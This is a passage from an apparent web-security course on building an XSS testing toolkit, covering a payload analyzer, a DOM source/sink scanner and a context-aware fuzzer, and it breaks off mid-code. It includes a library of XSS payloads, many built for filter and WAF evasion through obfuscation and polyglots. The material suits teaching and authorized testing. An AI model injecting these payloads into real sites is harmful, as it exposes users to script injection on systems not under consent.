---
id: plan-9-xss-mastery
title: "XSS Mastery - The Complete Web Security Toolkit"
sidebar_label: "🎯 XSS Mastery"
description: "Master Cross-Site Scripting by building a comprehensive security testing toolkit that detects, exploits, and prevents XSS vulnerabilities"
keywords: [xss, web security, dom manipulation, csp bypass, bug bounty, web application security, javascript security]
---

# XSS Mastery - The Complete Web Security Toolkit
### *Building the Ultimate XSS Hunter's Arsenal (The Ethical Way)*

> "Give a person a fish, they eat for a day. Teach them to find XSS vulnerabilities automatically, and they'll never go hungry on bug bounty platforms again." - Ancient Bug Hunter Wisdom

**The Big Idea**: You'll master web application security by building a comprehensive XSS detection and exploitation toolkit that can automatically discover, analyze, and report Cross-Site Scripting vulnerabilities. Think of it as your personal web security laboratory that finds the vulnerabilities others miss.

**Why This Approach Works**:
- XSS is the #1 web vulnerability (40% of all web app bugs)
- Manual testing is slow and inconsistent - automation is where the money is
- Understanding XSS deeply makes you better at finding ALL web vulnerabilities
- You'll build tools that could literally fund your security career
- By the end, you'll think like both an attacker AND a defender

**What You'll Build**: A complete web security testing suite with:
- Intelligent XSS payload generation and injection
- Context-aware DOM analysis and source/sink mapping
- Advanced CSP bypass detection and exploitation
- Professional vulnerability reporting with proof-of-concepts
- Polyglot payload library with WAF evasion techniques
- Intentionally vulnerable practice applications
- Browser automation for complex attack scenarios
- Integration with bug bounty and enterprise security workflows

## 🎯 The Complete 8-Module Journey

**Learning Philosophy**: *"You can't defend what you don't understand, and you can't understand what you can't build."*

Each module builds working tools while teaching core concepts. By Module 8, you'll have a professional-grade security toolkit.

---

## Module 1: XSS Foundations & The Payload Analyzer (Week 1)
*"Teaching Your Computer to Speak JavaScript (In All the Wrong Places)"*

**Learning Goals**: XSS fundamentals, payload analysis, basic automation, HTML/JavaScript security model
**Security Concepts**: Injection theory, trust boundaries, execution contexts, same-origin policy

**What You'll Build**: A payload analyzer that understands XSS injection points and can categorize attack vectors.

### The XSS Reality Check

*Imagine you're at a restaurant where the waiter repeats your order back to the kitchen exactly as you said it. Most customers say "I'll have the fish." But what if you said "I'll have the fish. Also, tell everyone in the restaurant their credit card info is showing." If the waiter repeats that EXACTLY, you've just performed a real-world XSS attack.*

**That's XSS**: When a web application takes your input and displays it without proper sanitization, allowing you to inject JavaScript that runs in other users' browsers.

### Day 1-2: The Foundation

```python
# File: course/exercises/xss_toolkit/core/payload_analyzer.py
import re
import html
import urllib.parse
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from enum import Enum

class XSSType(Enum):
    """Different types of XSS vulnerabilities"""
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    UNIVERSAL = "universal"

class Context(Enum):
    """Where the payload gets injected in HTML"""
    HTML_CONTENT = "html_content"          # <div>PAYLOAD</div>
    ATTRIBUTE_VALUE = "attribute_value"    # <div id="PAYLOAD">
    JAVASCRIPT_STRING = "js_string"        # var x = "PAYLOAD";
    JAVASCRIPT_VARIABLE = "js_variable"    # var PAYLOAD = 1;
    CSS_VALUE = "css_value"               # style="color:PAYLOAD"
    URL_PARAMETER = "url_parameter"       # ?param=PAYLOAD
    HTML_COMMENT = "html_comment"         # <!-- PAYLOAD -->
    UNKNOWN = "unknown"

@dataclass
class PayloadAnalysis:
    """Analysis results for an XSS payload"""
    payload: str
    contexts: List[Context]
    xss_types: List[XSSType]
    bypass_techniques: List[str]
    risk_level: str  # "low", "medium", "high", "critical"
    explanation: str
    proof_of_concept: str

class PayloadAnalyzer:
    """Analyzes XSS payloads and determines their capabilities"""
    
    def __init__(self):
        # Common HTML tags that can execute JavaScript
        self.script_tags = {
            'script', 'img', 'svg', 'iframe', 'object', 'embed', 
            'video', 'audio', 'source', 'track', 'input', 'body',
            'html', 'meta', 'link', 'style', 'form'
        }
        
        # JavaScript event handlers
        self.event_handlers = {
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onsubmit', 'onchange', 'onkeyup', 'onkeydown',
            'onmousedown', 'onmouseup', 'ondblclick', 'oncontextmenu',
            'onwheel', 'ondrag', 'ondrop', 'onanimationend', 'ontransitionend'
        }
        
        # WAF bypass techniques
        self.bypass_patterns = {
            'case_variation': r'[sS][cC][rR][iI][pP][tT]',
            'encoded_chars': r'&#\d+;|&#x[0-9a-fA-F]+;|%[0-9a-fA-F]{2}',
            'unicode_encoding': r'\\u[0-9a-fA-F]{4}',
            'mixed_quotes': r'[\'\"]+.*[\'\"]+',
            'comment_breaking': r'/\*.*?\*/',
            'whitespace_abuse': r'\s+',
            'protocol_confusion': r'javascript:|data:|vbscript:',
            'attribute_breaking': r'\w+\s*=\s*[^\s>]+'
        }
    
    def analyze_payload(self, payload: str) -> PayloadAnalysis:
        """Comprehensive analysis of an XSS payload"""
        
        # Normalize payload for analysis
        normalized = self._normalize_payload(payload)
        
        # Detect contexts where this payload might work
        contexts = self._detect_contexts(payload)
        
        # Determine XSS types
        xss_types = self._determine_xss_types(payload)
        
        # Identify bypass techniques
        bypass_techniques = self._identify_bypass_techniques(payload)
        
        # Calculate risk level
        risk_level = self._calculate_risk_level(payload, contexts, bypass_techniques)
        
        # Generate explanation
        explanation = self._generate_explanation(payload, contexts, xss_types, bypass_techniques)
        
        # Create proof of concept
        proof_of_concept = self._generate_proof_of_concept(payload, contexts)
        
        return PayloadAnalysis(
            payload=payload,
            contexts=contexts,
            xss_types=xss_types,
            bypass_techniques=bypass_techniques,
            risk_level=risk_level,
            explanation=explanation,
            proof_of_concept=proof_of_concept
        )
    
    def _normalize_payload(self, payload: str) -> str:
        """Normalize payload by decoding common encodings"""
        # HTML decode
        decoded = html.unescape(payload)
        
        # URL decode
        decoded = urllib.parse.unquote(decoded)
        
        # Unicode decode (basic)
        decoded = decoded.encode().decode('unicode_escape', errors='ignore')
        
        return decoded.lower()
    
    def _detect_contexts(self, payload: str) -> List[Context]:
        """Detect which HTML contexts this payload might exploit"""
        contexts = []
        payload_lower = payload.lower()
        
        # HTML Content Context
        if any(tag in payload_lower for tag in self.script_tags):
            contexts.append(Context.HTML_CONTENT)
        
        # Attribute Value Context  
        if any(handler in payload_lower for handler in self.event_handlers):
            contexts.append(Context.ATTRIBUTE_VALUE)
        
        # JavaScript String Context
        if any(char in payload for char in ['"', "'", '\\']):
            contexts.append(Context.JAVASCRIPT_STRING)
        
        # JavaScript Variable Context
        if re.search(r'\w+\s*=', payload):
            contexts.append(Context.JAVASCRIPT_VARIABLE)
        
        # CSS Value Context
        if 'expression(' in payload_lower or 'url(' in payload_lower:
            contexts.append(Context.CSS_VALUE)
        
        # URL Parameter Context
        if 'javascript:' in payload_lower or 'data:' in payload_lower:
            contexts.append(Context.URL_PARAMETER)
        
        # HTML Comment Context
        if '-->' in payload or '<!--' in payload:
            contexts.append(Context.HTML_COMMENT)
        
        return contexts if contexts else [Context.UNKNOWN]
    
    def _determine_xss_types(self, payload: str) -> List[XSSType]:
        """Determine what types of XSS this payload might achieve"""
        types = []
        payload_lower = payload.lower()
        
        # Reflected XSS indicators
        if '<script>' in payload_lower or any(handler in payload_lower for handler in self.event_handlers):
            types.append(XSSType.REFLECTED)
        
        # Stored XSS indicators (payloads that might persist)
        if len(payload) < 100 and not any(char in payload for char in ['<', '>', '"', "'"]):
            types.append(XSSType.STORED)
        
        # DOM-based XSS indicators
        if any(term in payload_lower for term in ['document.', 'window.', 'location.', 'eval(']):
            types.append(XSSType.DOM_BASED)
        
        # Universal payloads
        if '<img' in payload_lower and 'onerror=' in payload_lower:
            types.append(XSSType.UNIVERSAL)
        
        return types if types else [XSSType.REFLECTED]
    
    def _identify_bypass_techniques(self, payload: str) -> List[str]:
        """Identify WAF bypass techniques used in the payload"""
        techniques = []
        
        for technique, pattern in self.bypass_patterns.items():
            if re.search(pattern, payload, re.IGNORECASE):
                techniques.append(technique)
        
        return techniques
    
    def _calculate_risk_level(self, payload: str, contexts: List[Context], bypass_techniques: List[str]) -> str:
        """Calculate the risk level of the payload"""
        score = 0
        
        # Base score for payload complexity
        if len(payload) > 100:
            score += 1
        if len(payload) > 200:
            score += 1
        
        # Context scoring
        high_risk_contexts = {Context.HTML_CONTENT, Context.JAVASCRIPT_STRING, Context.ATTRIBUTE_VALUE}
        if any(ctx in high_risk_contexts for ctx in contexts):
            score += 2
        
        # Bypass technique scoring
        score += len(bypass_techniques)
        
        # Script tag detection
        if '<script>' in payload.lower():
            score += 3
        
        # Risk level mapping
        if score >= 6:
            return "critical"
        elif score >= 4:
            return "high"
        elif score >= 2:
            return "medium"
        else:
            return "low"
    
    def _generate_explanation(self, payload: str, contexts: List[Context], 
                            xss_types: List[XSSType], bypass_techniques: List[str]) -> str:
        """Generate human-readable explanation of the payload"""
        explanation = f"This payload attempts XSS exploitation through: "
        
        if contexts:
            context_names = [ctx.value.replace('_', ' ') for ctx in contexts]
            explanation += f"injection into {', '.join(context_names)} context(s)"
        
        if bypass_techniques:
            explanation += f", using bypass techniques: {', '.join(bypass_techniques)}"
        
        xss_type_names = [xss_type.value.replace('_', ' ') for xss_type in xss_types]
        explanation += f". Likely to succeed as {', '.join(xss_type_names)} XSS."
        
        return explanation
    
    def _generate_proof_of_concept(self, payload: str, contexts: List[Context]) -> str:
        """Generate a proof of concept for testing the payload"""
        poc = "Proof of Concept:\n\n"
        
        if Context.HTML_CONTENT in contexts:
            poc += f"HTML Context: <div>{payload}</div>\n"
        
        if Context.ATTRIBUTE_VALUE in contexts:
            poc += f"Attribute Context: <input value=\"{payload}\">\n"
        
        if Context.JAVASCRIPT_STRING in contexts:
            poc += f"JavaScript Context: var x = \"{payload}\";\n"
        
        poc += f"\nDirect test: {payload}"
        
        return poc
```

### Day 3-4: The Payload Library

```python
# File: course/exercises/xss_toolkit/payloads/payload_library.py
from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

class PayloadCategory(Enum):
    """Categories of XSS payloads"""
    BASIC = "basic"
    BYPASS = "bypass"
    POLYGLOT = "polyglot"
    ADVANCED = "advanced"
    OBFUSCATED = "obfuscated"

@dataclass
class XSSPayload:
    """Represents an XSS payload with metadata"""
    payload: str
    category: PayloadCategory
    description: str
    contexts: List[str]
    bypass_techniques: List[str]
    success_rate: float  # 0.0 to 1.0
    source: str  # Where this payload came from

class PayloadLibrary:
    """Comprehensive library of XSS payloads"""
    
    def __init__(self):
        self.payloads: Dict[PayloadCategory, List[XSSPayload]] = {
            PayloadCategory.BASIC: self._load_basic_payloads(),
            PayloadCategory.BYPASS: self._load_bypass_payloads(),
            PayloadCategory.POLYGLOT: self._load_polyglot_payloads(),
            PayloadCategory.ADVANCED: self._load_advanced_payloads(),
            PayloadCategory.OBFUSCATED: self._load_obfuscated_payloads()
        }
    
    def _load_basic_payloads(self) -> List[XSSPayload]:
        """Basic XSS payloads for initial testing"""
        return [
            XSSPayload(
                payload='<script>alert("XSS")</script>',
                category=PayloadCategory.BASIC,
                description="Classic script tag injection",
                contexts=["html_content"],
                bypass_techniques=[],
                success_rate=0.8,
                source="OWASP"
            ),
            XSSPayload(
                payload='<img src=x onerror=alert("XSS")>',
                category=PayloadCategory.BASIC,
                description="Image tag with onerror event",
                contexts=["html_content", "attribute_value"],
                bypass_techniques=[],
                success_rate=0.9,
                source="Common"
            ),
            XSSPayload(
                payload='<svg onload=alert("XSS")>',
                category=PayloadCategory.BASIC,
                description="SVG tag with onload event",
                contexts=["html_content"],
                bypass_techniques=[],
                success_rate=0.85,
                source="HTML5"
            ),
            XSSPayload(
                payload='javascript:alert("XSS")',
                category=PayloadCategory.BASIC,
                description="JavaScript protocol injection",
                contexts=["url_parameter", "attribute_value"],
                bypass_techniques=[],
                success_rate=0.7,
                source="Classic"
            ),
            XSSPayload(
                payload='" onclick=alert("XSS") "',
                category=PayloadCategory.BASIC,
                description="Attribute breaking with event handler",
                contexts=["attribute_value"],
                bypass_techniques=["attribute_breaking"],
                success_rate=0.75,
                source="Attribute injection"
            )
        ]
    
    def _load_bypass_payloads(self) -> List[XSSPayload]:
        """Payloads designed to bypass common filters"""
        return [
            XSSPayload(
                payload='<ScRiPt>alert("XSS")</ScRiPt>',
                category=PayloadCategory.BYPASS,
                description="Case variation to bypass case-sensitive filters",
                contexts=["html_content"],
                bypass_techniques=["case_variation"],
                success_rate=0.6,
                source="WAF bypass"
            ),
            XSSPayload(
                payload='<script>alert(String.fromCharCode(88,83,83))</script>',
                category=PayloadCategory.BYPASS,
                description="String encoding to hide payload content",
                contexts=["html_content"],
                bypass_techniques=["encoding"],
                success_rate=0.7,
                source="Encoding bypass"
            ),
            XSSPayload(
                payload='<img src=x onerror="alert`XSS`">',
                category=PayloadCategory.BYPASS,
                description="Template literals to bypass quote filters",
                contexts=["html_content"],
                bypass_techniques=["quote_bypass"],
                success_rate=0.65,
                source="ES6 bypass"
            ),
            XSSPayload(
                payload='<svg/onload=alert("XSS")>',
                category=PayloadCategory.BYPASS,
                description="Self-closing tag to bypass space filters",
                contexts=["html_content"],
                bypass_techniques=["whitespace_abuse"],
                success_rate=0.8,
                source="Whitespace bypass"
            ),
            XSSPayload(
                payload='<iframe src="javascript:alert`XSS`">',
                category=PayloadCategory.BYPASS,
                description="Iframe with JavaScript protocol and template literals",
                contexts=["html_content"],
                bypass_techniques=["protocol_confusion", "quote_bypass"],
                success_rate=0.55,
                source="Complex bypass"
            )
        ]
    
    def _load_polyglot_payloads(self) -> List[XSSPayload]:
        """Polyglot payloads that work in multiple contexts"""
        return [
            XSSPayload(
                payload='jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
                category=PayloadCategory.POLYGLOT,
                description="Universal polyglot payload working in many contexts",
                contexts=["html_content", "attribute_value", "javascript_string", "url_parameter"],
                bypass_techniques=["case_variation", "comment_breaking", "encoded_chars", "mixed_quotes"],
                success_rate=0.4,
                source="PortSwigger"
            ),
            XSSPayload(
                payload='"onclick=alert() a="',
                category=PayloadCategory.POLYGLOT,
                description="Simple polyglot for attribute and HTML contexts",
                contexts=["attribute_value", "html_content"],
                bypass_techniques=["attribute_breaking"],
                success_rate=0.7,
                source="Common polyglot"
            ),
            XSSPayload(
                payload='</script><img/src="" onerror=alert()>',
                category=PayloadCategory.POLYGLOT,
                description="Script context breaking with image injection",
                contexts=["javascript_string", "html_content"],
                bypass_techniques=["context_breaking"],
                success_rate=0.6,
                source="Context breaking"
            )
        ]
    
    def _load_advanced_payloads(self) -> List[XSSPayload]:
        """Advanced XSS payloads for complex scenarios"""
        return [
            XSSPayload(
                payload='<details open ontoggle=alert()>',
                category=PayloadCategory.ADVANCED,
                description="HTML5 details element with ontoggle event",
                contexts=["html_content"],
                bypass_techniques=["html5_events"],
                success_rate=0.85,
                source="HTML5 advanced"
            ),
            XSSPayload(
                payload='<video><source onerror="alert()">',
                category=PayloadCategory.ADVANCED,
                description="Video element with source onerror",
                contexts=["html_content"],
                bypass_techniques=["html5_media"],
                success_rate=0.8,
                source="Media elements"
            ),
            XSSPayload(
                payload='<math><mi//xlink:href="data:x,<script>alert()</script>">',
                category=PayloadCategory.ADVANCED,
                description="MathML with XLink namespace injection",
                contexts=["html_content"],
                bypass_techniques=["namespace_confusion", "protocol_confusion"],
                success_rate=0.3,
                source="XML namespaces"
            ),
            XSSPayload(
                payload='<template><script>alert()</script></template>',
                category=PayloadCategory.ADVANCED,
                description="HTML5 template element with deferred execution",
                contexts=["html_content"],
                bypass_techniques=["html5_template"],
                success_rate=0.4,
                source="Template injection"
            )
        ]
    
    def _load_obfuscated_payloads(self) -> List[XSSPayload]:
        """Heavily obfuscated payloads for advanced evasion"""
        return [
            XSSPayload(
                payload='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,41))>',
                category=PayloadCategory.OBFUSCATED,
                description="Character code obfuscation with eval",
                contexts=["html_content"],
                bypass_techniques=["encoding", "obfuscation"],
                success_rate=0.5,
                source="Encoding obfuscation"
            ),
            XSSPayload(
                payload='<svg onload="this[\\x61\\x6c\\x65\\x72\\x74]()">',
                category=PayloadCategory.OBFUSCATED,
                description="Hex encoding with bracket notation",
                contexts=["html_content"],
                bypass_techniques=["unicode_encoding", "bracket_notation"],
                success_rate=0.45,
                source="Unicode obfuscation"
            ),
            XSSPayload(
                payload='<iframe/onload=top[8680439..toString(30)](1337)>',
                category=PayloadCategory.OBFUSCATED,
                description="Numeric obfuscation with toString radix",
                contexts=["html_content"],
                bypass_techniques=["numeric_obfuscation"],
                success_rate=0.35,
                source="Mathematical obfuscation"
            )
        ]
    
    def get_payloads_by_category(self, category: PayloadCategory) -> List[XSSPayload]:
        """Get all payloads in a specific category"""
        return self.payloads.get(category, [])
    
    def get_payloads_by_context(self, context: str) -> List[XSSPayload]:
        """Get payloads suitable for a specific injection context"""
        matching_payloads = []
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if context in payload.contexts:
                    matching_payloads.append(payload)
        return sorted(matching_payloads, key=lambda p: p.success_rate, reverse=True)
    
    def get_best_payloads(self, limit: int = 10) -> List[XSSPayload]:
        """Get the highest success rate payloads"""
        all_payloads = []
        for category_payloads in self.payloads.values():
            all_payloads.extend(category_payloads)
        return sorted(all_payloads, key=lambda p: p.success_rate, reverse=True)[:limit]
    
    def search_payloads(self, keyword: str) -> List[XSSPayload]:
        """Search payloads by keyword in description or payload"""
        matching_payloads = []
        keyword_lower = keyword.lower()
        
        for category_payloads in self.payloads.values():
            for payload in category_payloads:
                if (keyword_lower in payload.description.lower() or 
                    keyword_lower in payload.payload.lower()):
                    matching_payloads.append(payload)
        
        return matching_payloads
```

---

## Module 2: DOM XSS Detective - JavaScript Source/Sink Analysis (Week 2)
*"Teaching Your Computer to Read JavaScript Like a Security Expert"*

**Learning Goals**: DOM-based XSS detection, JavaScript AST parsing, data flow analysis, client-side vulnerability assessment
**Security Concepts**: DOM manipulation, source/sink analysis, data flow tracing, client-side security

**What You'll Build**: A JavaScript parser that identifies DOM XSS vulnerabilities by tracing data flow from dangerous sources to dangerous sinks.

### The DOM XSS Challenge

DOM-based XSS is the hardest to find because it exists entirely in client-side JavaScript. Unlike reflected or stored XSS, the malicious payload never touches the server - it's processed entirely by the browser's DOM.

```python
# File: course/exercises/xss_toolkit/dom/javascript_parser.py
import re
import json
from typing import List, Dict, Set, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class SourceType(Enum):
    """Types of dangerous data sources in DOM XSS"""
    URL_LOCATION = "location"                    # window.location, document.location
    URL_SEARCH = "search"                        # location.search, location.hash
    URL_HASH = "hash"                           # location.hash
    REFERRER = "referrer"                       # document.referrer
    POSTMESSAGE = "postMessage"                 # window.addEventListener('message')
    WEBSOCKET = "websocket"                     # WebSocket messages
    AJAX_RESPONSE = "ajax"                      # XMLHttpRequest.responseText
    LOCAL_STORAGE = "localStorage"              # localStorage.getItem()
    SESSION_STORAGE = "sessionStorage"          # sessionStorage.getItem()
    COOKIE = "cookie"                           # document.cookie
    USER_INPUT = "input"                        # form inputs, prompt()
    WINDOW_NAME = "window.name"                 # window.name property

class SinkType(Enum):
    """Types of dangerous data sinks in DOM XSS"""
    INNER_HTML = "innerHTML"                    # element.innerHTML
    OUTER_HTML = "outerHTML"                    # element.outerHTML
    DOCUMENT_WRITE = "document.write"           # document.write(), document.writeln()
    EVAL = "eval"                               # eval(), Function()
    SET_TIMEOUT = "setTimeout"                  # setTimeout(), setInterval()
    SCRIPT_SRC = "script.src"                   # script.src
    IFRAME_SRC = "iframe.src"                   # iframe.src
    LOCATION_HREF = "location.href"             # location.href, location.assign()
    JQUERY_HTML = "jquery.html"                 # $(element).html()
    JQUERY_APPEND = "jquery.append"             # $(element).append()
    EXECUTE_SCRIPT = "executeScript"            # Various script execution methods
    INSERT_ADJACENT_HTML = "insertAdjacentHTML" # element.insertAdjacentHTML()

@dataclass
class JavaScriptSource:
    """Represents a dangerous data source in JavaScript"""
    source_type: SourceType
    variable_name: str
    line_number: int
    code_snippet: str
    risk_level: str
    tainted: bool = True
    confidence: float = 0.8

@dataclass
class JavaScriptSink:
    """Represents a dangerous data sink in JavaScript"""
    sink_type: SinkType
    variable_name: str
    line_number: int
    code_snippet: str
    risk_level: str
    requires_user_interaction: bool = False
    confidence: float = 0.8

@dataclass
class DataFlowPath:
    """Represents a data flow from source to sink"""
    source: JavaScriptSource
    sink: JavaScriptSink
    intermediate_variables: List[str]
    transformations: List[str]
    vulnerability_confidence: float  # 0.0 to 1.0
    exploit_payload: str
    exploitation_steps: List[str]

class JavaScriptParser:
    """
    Parser for analyzing JavaScript code for DOM XSS vulnerabilities.
    
    This parser identifies dangerous sources and sinks in JavaScript code
    and traces data flow to find DOM XSS vulnerabilities.
    """
    
    def __init__(self):
        # Enhanced patterns for identifying sources
        self.source_patterns = {
            SourceType.URL_LOCATION: [
                r'(?:window\\.|document\\.)?location(?:\\.href)?(?!\\s*=)',
                r'(?:window\\.|document\\.)?location\\.(?:pathname|search|hash|host)',
                r'document\\.URL',
                r'document\\.documentURI'
            ],
            SourceType.URL_HASH: [
                r'location\\.hash',
                r'window\\.location\\.hash',
                r'document\\.location\\.hash'
            ],
            SourceType.POSTMESSAGE: [
                r'addEventListener\\s*\\(\\s*["\\'']message["\\'']\\s*,',
                r'onmessage\\s*=',
                r'event\\.data',
                r'e\\.data'
            ],
            SourceType.LOCAL_STORAGE: [
                r'localStorage\\.getItem\\s*\\(',
                r'localStorage\\[["\\''][^"\\']+["\\'']\\]'
            ]
        }
        
        # Enhanced patterns for identifying sinks
        self.sink_patterns = {
            SinkType.INNER_HTML: [
                r'\\.innerHTML\\s*=',
                r'\\.innerHTML\\s*\\+=',
                r'innerHTML\\s*='
            ],
            SinkType.DOCUMENT_WRITE: [
                r'document\\.write\\s*\\(',
                r'document\\.writeln\\s*\\('
            ],
            SinkType.EVAL: [
                r'\\beval\\s*\\(',
                r'Function\\s*\\(',
                r'new\\s+Function\\s*\\('
            ],
            SinkType.LOCATION_HREF: [
                r'location\\.href\\s*=',
                r'window\\.location\\.href\\s*=',
                r'location\\.assign\\s*\\('
            ]
        }
    
    def analyze_javascript(self, javascript_code: str) -> Tuple[List[JavaScriptSource], List[JavaScriptSink], List[DataFlowPath]]:
        """
        Analyze JavaScript code for DOM XSS vulnerabilities.
        
        Returns:
            Tuple of (sources, sinks, data_flow_paths)
        """
        lines = javascript_code.split('\\n')
        
        # Find sources and sinks
        sources = self._find_sources(lines)
        sinks = self._find_sinks(lines)
        
        # Trace data flows
        data_flows = self._trace_data_flows(lines, sources, sinks)
        
        return sources, sinks, data_flows
    
    def _find_sources(self, lines: List[str]) -> List[JavaScriptSource]:
        """Find dangerous data sources in JavaScript code"""
        sources = []
        
        for line_num, line in enumerate(lines, 1):
            line_clean = line.strip()
            
            for source_type, patterns in self.source_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, line_clean, re.IGNORECASE):
                        var_name = self._extract_variable_assignment(line_clean)
                        risk_level = self._calculate_source_risk(source_type)
                        
                        source = JavaScriptSource(
                            source_type=source_type,
                            variable_name=var_name or f"source_{line_num}",
                            line_number=line_num,
                            code_snippet=line_clean,
                            risk_level=risk_level
                        )
                        sources.append(source)
                        break
        
        return sources
    
    def _find_sinks(self, lines: List[str]) -> List[JavaScriptSink]:
        """Find dangerous data sinks in JavaScript code"""
        sinks = []
        
        for line_num, line in enumerate(lines, 1):
            line_clean = line.strip()
            
            for sink_type, patterns in self.sink_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, line_clean, re.IGNORECASE):
                        var_name = self._extract_sink_variable(line_clean)
                        risk_level = self._calculate_sink_risk(sink_type)
                        
                        sink = JavaScriptSink(
                            sink_type=sink_type,
                            variable_name=var_name or f"sink_{line_num}",
                            line_number=line_num,
                            code_snippet=line_clean,
                            risk_level=risk_level
                        )
                        sinks.append(sink)
                        break
        
        return sinks
    
    def _trace_data_flows(self, lines: List[str], sources: List[JavaScriptSource], 
                         sinks: List[JavaScriptSink]) -> List[DataFlowPath]:
        """Trace data flow from sources to sinks"""
        data_flows = []
        
        # For each sink, check if it uses tainted data
        for sink in sinks:
            for source in sources:
                if self._has_data_flow(source, sink, lines):
                    payload = self._generate_dom_xss_payload(source, sink)
                    steps = self._generate_exploitation_steps(source, sink)
                    
                    flow = DataFlowPath(
                        source=source,
                        sink=sink,
                        intermediate_variables=[],
                        transformations=[],
                        vulnerability_confidence=0.8,
                        exploit_payload=payload,
                        exploitation_steps=steps
                    )
                    data_flows.append(flow)
        
        return data_flows
    
    def _has_data_flow(self, source: JavaScriptSource, sink: JavaScriptSink, lines: List[str]) -> bool:
        """Check if there's a data flow between source and sink"""
        # Simplified: check if source variable is used in sink
        return source.variable_name in sink.code_snippet
    
    def _generate_dom_xss_payload(self, source: JavaScriptSource, sink: JavaScriptSink) -> str:
        """Generate appropriate DOM XSS payload"""
        if source.source_type == SourceType.URL_HASH:
            if sink.sink_type == SinkType.INNER_HTML:
                return "#<img src=x onerror=alert('DOM-XSS')>"
            elif sink.sink_type == SinkType.EVAL:
                return "#';alert('DOM-XSS');//"
        
        return "<img src=x onerror=alert('DOM-XSS')>"
    
    def _generate_exploitation_steps(self, source: JavaScriptSource, sink: JavaScriptSink) -> List[str]:
        """Generate exploitation steps"""
        if source.source_type == SourceType.URL_HASH:
            return [
                "1. Navigate to the vulnerable page",
                f"2. Append payload to URL hash: {self._generate_dom_xss_payload(source, sink)}",
                "3. The JavaScript will process the hash value",
                f"4. The {sink.sink_type.value} sink will execute the payload"
            ]
        
        return ["1. Inject payload into the source", "2. Trigger the vulnerable code path"]
```

---

## Module 3: Context-Aware XSS Fuzzing Engine (Week 3)
*"Teaching Your Payloads to Speak Every Language"*

**Learning Goals**: Intelligent fuzzing, context detection, adaptive payload generation, WAF evasion
**Security Concepts**: Injection contexts, encoding strategies, filter bypass techniques

**What You'll Build**: A fuzzing engine that automatically adapts payloads based on injection context and learns from responses.

### The Context Problem

Not all XSS payloads work in all contexts. A payload that works in HTML content might fail in a JavaScript string or CSS property. Smart attackers adapt their payloads to the injection context.

```python
# File: course/exercises/xss_toolkit/fuzzing/context_fuzzer.py
import re
import html
import urllib.parse
from typing import List, Dict, Set, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class InjectionContext(Enum):
    """Detailed injection contexts for XSS"""
    HTML_TAG_CONTENT = "html_tag_content"              # <div>HERE</div>
    HTML_ATTRIBUTE_VALUE = "html_attribute_value"      # <div id="HERE">
    JAVASCRIPT_STRING_SINGLE = "js_string_single"      # var x = 'HERE';
    JAVASCRIPT_STRING_DOUBLE = "js_string_double"      # var x = "HERE";
    CSS_PROPERTY_VALUE = "css_property_value"          # color: HERE;
    URL_PARAMETER = "url_parameter"                    # ?param=HERE

@dataclass
class FuzzingResult:
    """Result of a fuzzing attempt"""
    payload: str
    context: InjectionContext
    success: bool
    confidence: float
    mutations_applied: List[str]
    encoding_used: str
    response_indicators: Dict[str, any]
    waf_detected: bool
    waf_type: Optional[str]

class ContextAwareFuzzer:
    """
    Advanced context-aware XSS fuzzing engine.
    
    This fuzzer intelligently adapts payloads based on the detected
    injection context and learns from responses to improve effectiveness.
    """
    
    def __init__(self):
        # Context detection patterns
        self.context_patterns = {
            InjectionContext.HTML_TAG_CONTENT: [
                (r'<[^>]+>([^<]*?){INJECTION}([^<]*?)</[^>]+>', 'HTML tag content'),
            ],
            InjectionContext.HTML_ATTRIBUTE_VALUE: [
                (r'<[^>]+\\s+\\w+=["\\'']([^"\\']*?){INJECTION}([^"\\']*?)["\\''][^>]*>', 'Quoted attribute'),
            ],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: [
                (r"'([^']*?){INJECTION}([^']*?)'", 'Single-quoted JS string'),
            ],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: [
                (r'"([^"]*?){INJECTION}([^"]*?)"', 'Double-quoted JS string'),
            ]
        }
        
        # Context-specific breaking sequences
        self.context_breakers = {
            InjectionContext.HTML_TAG_CONTENT: ['<', '>', '</', '/>'],
            InjectionContext.HTML_ATTRIBUTE_VALUE: ['"', "'", ' ', '>'],
            InjectionContext.JAVASCRIPT_STRING_SINGLE: ["'", '\\\\', '\\n'],
            InjectionContext.JAVASCRIPT_STRING_DOUBLE: ['"', '\\\\', '\\n'],
            InjectionContext.CSS_PROPERTY_VALUE: [';', '}', '/*', '*/'],
            InjectionContext.URL_PARAMETER: ['&', '#', ' ', '%00']
        }
        
        # Encoding functions
        self.encoders = {
            'none': lambda x: x,
            'html': html.escape,
            'url': urllib.parse.quote,
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            'unicode': lambda x: ''.join(f'\\\\u{ord(c):04x}' for c in x),
            'html_decimal': lambda x: ''.join(f'&#{ord(c)};' for c in x)
        }
        
        # WAF signatures
        self.waf_signatures = {
            'ModSecurity': ['ModSecurity', 'Mod_Security'],
            'AWS WAF': ['AWS WAF', 'AWSalb'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'Akamai': ['akamai', 'akamai-ghost']
        }
    
    def detect_context(self, response: str, injection_marker: str = "CANARY") -> InjectionContext:
        """
        Detect the injection context by analyzing where the marker appears.
        """
        # Find all occurrences of the marker
        marker_positions = self._find_marker_positions(response, injection_marker)
        
        if not marker_positions:
            return InjectionContext.HTML_TAG_CONTENT  # Default
        
        # Analyze each occurrence
        for pos in marker_positions:
            context = self._analyze_context_at_position(response, pos, injection_marker)
            if context:
                return context
        
        return InjectionContext.HTML_TAG_CONTENT
    
    def generate_payloads(self, context: InjectionContext, 
                         base_payloads: Optional[List[str]] = None) -> List[str]:
        """Generate context-aware payloads."""
        if base_payloads is None:
            base_payloads = self._get_default_payloads(context)
        
        adapted_payloads = []
        
